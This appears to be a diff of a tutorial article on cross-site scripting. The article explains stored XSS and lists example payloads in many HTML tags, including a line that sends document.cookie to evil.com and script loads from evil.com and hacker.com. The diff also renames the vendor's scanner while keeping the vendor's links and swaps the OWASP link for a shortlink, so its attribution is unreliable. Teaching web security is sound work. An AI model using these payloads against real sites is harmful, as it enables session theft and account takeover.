@@ -1,3 +1,9 @@
+---
+title: Cross-site Scripting (XSS) Attack
+author: Arsen A. Gutsal
+layout: text-and-images
+---
+
 **Cross-site Scripting (XSS) Attack**
 =====================================
 
@@ -36,10 +42,10 @@ victim’s browser.
 The following server-side pseudo-code is used to display the most recent
 comment on a web page.
 
-**print** "&lt;html&gt;"\
-**print** "&lt;h1&gt;Most recent comment&lt;/h1&gt;"\
-**print** database.latestComment\
-**print** "&lt;/html&gt;"
+	print "<html>"
+	print "<h1>Most recent comment</h1>"
+	print database.latestComment
+	print "</html>"
 
 The above script is simply printing out the latest comment from a
 comments database and printing the contents out to an HTML page,
@@ -51,10 +57,10 @@ comment that contains a malicious payload such as
 
 Users visiting the web page will get served the following HTML page.
 
-&lt;html&gt;\
-&lt;h1&gt;Most recent comment&lt;/h1&gt;\
-&lt;script&gt;**doSomethingEvil();**&lt;/script&gt;\
-&lt;/html&gt;
+      <html>
+      <h1>Most recent comment</h1>
+      <script>doSomethingEvil();</script>
+      </html>
 
 When the page loads in the victim’s browser, the attacker’s malicious
 script will execute, most often without the user realizing or being able
@@ -78,21 +84,21 @@ it’s easier to understand how creative attackers can get with
 JavaScript.
 
 -   Malicious JavaScript has access to all the same objects the rest of
-    > the web page has, including access to cookies. Cookies are often
-    > used to store session tokens, if an attacker can obtain a user’s
-    > session cookie, they can impersonate that user.
+     the web page has, including access to cookies. Cookies are often
+     used to store session tokens, if an attacker can obtain a user’s
+     session cookie, they can impersonate that user.
 
 -   JavaScript can read and make arbitrary modifications to the
-    > browser’s DOM (within the page that JavaScript is running).
+     browser’s DOM (within the page that JavaScript is running).
 
 -   JavaScript can use XMLHttpRequest to send HTTP requests with
-    > arbitrary content to arbitrary destinations.
+     arbitrary content to arbitrary destinations.
 
 -   JavaScript in modern browsers can leverage HTML5 APIs such as
-    > accessing a user’s geolocation, webcam, microphone and even the
-    > specific files from the user’s file system. While most of these
-    > APIs require user opt-in, XSS in conjunction with some clever
-    > social engineering can bring an attacker a long way.
+     accessing a user’s geolocation, webcam, microphone and even the
+     specific files from the user’s file system. While most of these
+     APIs require user opt-in, XSS in conjunction with some clever
+     social engineering can bring an attacker a long way.
 
 The above, in combination with social engineering, allow attackers to
 pull off advanced attacks including cookie theft, keylogging, phishing
@@ -120,15 +126,14 @@ cookie to a server the attacker controls can be achieved in a variety of
 ways, one of which is for the attacker to execute the following
 JavaScript code in the victim’s browser through an XSS vulnerability.
 
-&lt;script&gt;\
-window.location=“http:*//evil.com/?cookie=” + document.cookie*\
-&lt;/script&gt;
+	   <script>
+	   window.location=“http://evil.com/?cookie=” + document.cookie
+	   </script>
 
 The figure below illustrates a step-by-step walkthrough of a simple XSS
 attack.
 
-![](media/website-security/cross-site-scripting.md-images/media/image01.png){width="6.267716535433071in"
-height="2.7777777777777777in"}
+![](/media/website-security/cross-site-scripting.md-images/media/image01.png)
 
 1.  The attacker injects a payload in the website’s database by
     > submitting a vulnerable form with some malicious JavaScript
@@ -160,10 +165,10 @@ The &lt;script&gt; tag is the most straight-forward XSS payload. A
 script tag can either reference external JavaScript code, or embed the
 code within the script tag.
 
-*&lt;!-- External script --&gt;*\
-&lt;script src=http://evil.com/xss.js&gt;&lt;/script&gt;\
-*&lt;!-- Embedded script --&gt;*\
-&lt;script&gt; alert("XSS"); &lt;/script&gt;
+     <!-- External script -->*
+     <script src=http://evil.com/xss.js></script>
+     <!-- Embedded script -->
+     <script> alert("XSS"); </script>
 
 ### **&lt;body&gt; tag**
 
@@ -171,20 +176,20 @@ An XSS payload can be delivered inside &lt;body&gt; tag by using the
 onload attribute or other more obscure attributes such as the background
 attribute.
 
-*&lt;!-- onload attribute --&gt;*\
-&lt;body onload=alert("XSS")&gt;\
-*&lt;!-- background attribute --&gt;*\
-&lt;body background="javascript:alert("XSS")"&gt;
+	<!-- onload attribute -->
+	<body onload=alert("XSS")>
+	<!-- background attribute -->
+	<body background="javascript:alert("XSS")">
 
 ### **&lt;img&gt; tag**
 
 Some browsers will execute JavaScript when found in the &lt;img&gt;.
 
-*&lt;!-- &lt;img&gt; tag XSS --&gt;*\
-&lt;img src="javascript:alert("XSS");"&gt;\
-*&lt;!-- tag XSS using lesser-known attributes --&gt;*\
-&lt;img dynsrc="javascript:alert('XSS')"&gt;\
-&lt;img lowsrc="javascript:alert('XSS')"&gt;
+     <!-- <img> tag XSS -->
+     <img src="javascript:alert("XSS");">
+     <!-- tag XSS using lesser-known attributes -->
+     <img dynsrc="javascript:alert('XSS')">
+     <img lowsrc="javascript:alert('XSS')">
 
 ### **&lt;iframe&gt; tag**
 
@@ -195,52 +200,56 @@ to the DOM of the parent’s page do to the browser’s Content Security
 Policy (CSP). However, IFrames are still very effective means of pulling
 off phising attacks.
 
-*&lt;!-- &lt;iframe&gt; tag XSS --&gt;*\
-&lt;iframe src=”http://evil.com/xss.html”&gt;
+    <!-- <iframe> tag XSS -->
+    <iframe src=”http://evil.com/xss.html”>
 
 ### **&lt;input&gt; tag**
 
 In some browsers, if the type attribute of the &lt;input&gt; tag is set
 to image, it can be manipulated to embed a script.
 
-*&lt;!-- &lt;input&gt; tag XSS --&gt;*\
-&lt;input type="image" src="javascript:alert('XSS');"&gt;
+```
+	<!-- <input> tag XSS -->
+	<input type="image" src="javascript:alert('XSS');">
+```
 
 ### **&lt;link&gt; tag**
 
 The &lt;link&gt; tag, which is often used to link to external style
 sheets could contain a script.
 
-*&lt;!-- &lt;link&gt; tag XSS --&gt;*\
-&lt;link rel="stylesheet" href="javascript:alert('XSS');"&gt;
+       <!-- <link> tag XSS -->	
+       <link rel="stylesheet" href="javascript:alert('XSS');">
 
 ### **&lt;table&gt; tag**
 
 The background attribute of the table and td tags can be exploited to
 refer to a script instead of an image.
 
-*&lt;!-- &lt;table&gt; tag XSS --&gt;*\
-&lt;table background="javascript:alert('XSS')"&gt;\
-*&lt;!-- &lt;td&gt; tag XSS --&gt;*\
-&lt;td background="javascript:alert('XSS')"&gt;
+      <!-- <table> tag XSS -->
+      <table background="javascript:alert('XSS')">
+      <!-- <td> tag XSS -->
+      <td background="javascript:alert('XSS')">
 
 ### **&lt;div&gt; tag**
 
 The &lt;div&gt; tag, similar to the &lt;table&gt; and &lt;td&gt; tags
 can also specify a background and therefore embed a script.
 
-*&lt;!-- &lt;div&gt; tag XSS --&gt;*\
-&lt;div style="background-image: url(javascript:alert('XSS'))"&gt;\
-*&lt;!-- &lt;div&gt; tag XSS --&gt;*\
-&lt;div style="width: expression(alert('XSS'));"&gt;
+```
+    <!-- <div> tag XSS -->
+    <div style="background-image: url(javascript:alert('XSS'))">
+    <!-- <div> tag XSS -->
+    <div style="width: expression(alert('XSS'));">
+```
 
 ### **&lt;object&gt; tag**
 
 The &lt;object&gt; tag can be used to include in a script from an
 external site.
 
-*&lt;!-- &lt;object&gt; tag XSS --&gt;*\
-&lt;object type="text/x-scriptlet" data="http://hacker.com/xss.html"&gt;
+	 <!-- <object> tag XSS -->
+	 <object type="text/x-scriptlet" data="http://hacker.com/xss.html">
 
 **Is your website or web application vulnerable to Cross-site Scripting?**
 --------------------------------------------------------------------------
@@ -249,7 +258,7 @@ XSS vulnerabilities are amongst the most widespread web application
 vulnerabilities on the Internet. Fortunately, it’s easy to test if your
 website or web application is vulnerable to XSS and other
 vulnerabilities by running an automated web vulnerability scan using
-Acunetix Vulnerability Scanner.
+SOFTSKY Vulnerability Scanner.
 [Download](http://www.acunetix.com/vulnerability-scanner/download/) the
 14-day free on-premise trial, or
 [register](http://www.acunetix.com/vulnerability-scanner/register-online-vulnerability-scanner/)
@@ -260,10 +269,8 @@ application.
 
 -   [Types of XSS](http://www.acunetix.com/websitesecurity/xss/)
 
--   [A comprehensive tutorial on Cross-site
-    > Scripting](http://excess-xss.com/)
+-   [A comprehensive tutorial on Cross-site Scripting](http://excess-xss.com/)
 
--   [XSS Prevention Cheat
-    > Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
+-   [XSS Prevention Cheat Sheet](http://bit.ly/2cIPoT9)
 
 
